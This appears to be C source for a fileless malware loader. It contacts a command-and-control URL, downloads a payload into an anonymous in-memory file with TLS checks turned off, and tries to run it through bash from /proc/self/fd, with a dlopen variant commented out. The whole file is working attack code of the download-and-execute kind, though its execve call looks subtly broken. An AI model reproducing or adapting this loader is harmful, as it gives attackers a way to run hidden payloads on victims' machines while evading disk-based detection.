#include <curl/curl.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#define SHM_NAME "memfd_file"

int kernel_version()
{
	struct utsname buffer;
	uname(&buffer);
	
	char *token;
	char separator[] = ".";
	
	token = strtok(buffer.release, separator);
	if (atoi(token) < 3)
		return 0;
	else if (atoi(token) > 3)
		return 1;

	token = strtok(NULL, separator);
	if (atoi(token) < 17)
		return 0;
	else
		return 1;
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void)
{
	int shm_fd;

	if (kernel_version() == 0)
    {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0)
        {
			fprintf(stderr, "[-] Could not open file descriptor\n");
			exit(-1);
		}
	}
	else 
    {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0)
        {
			fprintf(stderr, "[- Could not open file descriptor\n");
			exit(-1);
		}
	}
	return shm_fd;
}

size_t write_data (void *ptr, size_t size, size_t nmemb, int shm_fd) {
    int bytes = write(shm_fd, ptr, nmemb);
	if (bytes < 0) {
		fprintf(stderr, "[-] Could not write file :'(\n");
		close(shm_fd);
		exit(-1);
	}
	printf("[+] File written!\n");
    
    return bytes;
}

int download_to_RAM(char *download) { 
	CURL *curl;
	CURLcode res;
	int shm_fd;

	shm_fd = open_ramfs();
	printf("[+] File Descriptor Shared Memory created!\n");
    
	curl = curl_easy_init();
	if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, download);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Too lazy to search for one");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_fd); //Args for our callback

        res = curl_easy_perform(curl);
        if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
            fprintf(stderr, "[-] cURL failed: %s\n", curl_easy_strerror(res));
            close(shm_fd);
            exit(-1);
        }
        curl_easy_cleanup(curl);
        return shm_fd;
	}
	
	return -1;
}

// Load the shared object
void load_so(int shm_fd) {
	char path[1024];
	void *handle;

	printf("[+] Trying to load Shared Object!\n");
	if (kernel_version() == 1) { //Funky way
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	}
	
	printf("Loading from [%s]\n", path);

    char *const parmList[] = {path, NULL};
    char *const envParms[] = {NULL};
    pid_t pid;

    //if ((pid = fork()) ==-1)
        //perror("fork error");
    //else if (pid == 0) {
        execve("/usr/bin/bash", parmList, envParms);
        printf("Return not expected. Must be an execve error.n");
    //}

	//handle = dlopen(path, RTLD_LAZY);
	//if (!handle) {
		//fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
	//}
}

int main (int argc, char **argv) {
	char url[] = "http://localhost:8000/sharedbin";
	int fd;

	printf("[+] Trying to reach C&C & start download...\n");
	fd = download_to_RAM(url);
	load_so(fd);
	exit(0);
}
